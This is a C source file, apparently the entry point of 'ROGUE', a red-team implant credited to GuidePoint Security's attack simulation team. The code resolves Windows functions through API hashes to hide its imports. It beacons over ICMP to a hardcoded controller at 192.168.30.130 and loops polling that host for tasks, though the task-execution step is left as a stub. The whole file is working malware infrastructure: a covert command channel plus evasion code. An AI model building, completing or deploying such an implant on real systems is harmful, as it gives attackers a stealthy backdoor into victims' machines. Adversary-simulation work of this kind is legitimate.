/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
{
	UINT32	UniqueTaskId;
	UINT32	ReturnCode;
	UINT32	ErrorCode;
	UCHAR	Buffer[0];
} CMD_RET_HDR ;

typedef struct
{
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Starts tasking back to Navi, executes the
 * task, sends the result, and then goes to
 * sleep.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	API		Api;
	CMD_RET_HDR	Crh;

	BOOL		Rcv = FALSE;
	PBUFFER		Inb = NULL;
	PBUFFER		Onb = NULL;
	PROGUE_CTX	Ctx = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Crh, sizeof( Crh ) );

	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Create a buffer to hold the rogue context */
	if ( ( Ctx = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( ROGUE_CTX ) ) ) != NULL ) {

		/* Create a random integer constant */
		RandomString( Ctx->Id, sizeof( Ctx->Id ) );

		/* Create initial output buffer */
		if ( ( Onb = BufferCreate() ) != NULL ) {

			/* Append the starting ID */
			if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {

				/* Append response task header */
				if ( BufferAddRaw( Onb, &Crh, sizeof( Crh ) ) ) {

					/* Execute "Hello" */
					if ( TaskHello( NULL, 0, Onb ) ) {
						/* Change the IP to be configurable */
						Ctx->Established = IcmpSendRecv( C_PTR( G_PTR( "192.168.30.130" ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
					};
				};
			};

			/* Cleanup */
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb->Buffer );
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb );
			Onb = NULL;
		};

		/* First hello sent and established */
		if ( Ctx->Established != FALSE ) {
			/* Start tasking loop. Finish once disconnected */
			for ( ; Ctx->Established != FALSE ; ) {

				Onb = NULL;
				Inb = NULL;
				Rcv = FALSE;

				/* Create command request buffer */
				if ( ( Inb = BufferCreate() ) != NULL ) {

					/* Read the entire buffer */
					if ( IcmpSendRecv( C_PTR( G_PTR( "192.168.30.130" ) ), Ctx->Id, sizeof( Ctx->Id ), &Inb->Buffer, &Inb->Length, &Rcv ) ) {
						if ( Rcv != FALSE && Inb->Buffer != NULL && Inb->Length != 0 ) {
							/* Execute task! */
						};
					};

					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );
					Inb = NULL;
				};
			};
		};

		/* Cleanup */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ctx );
		Ctx = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Crh, sizeof( Crh ) );
};
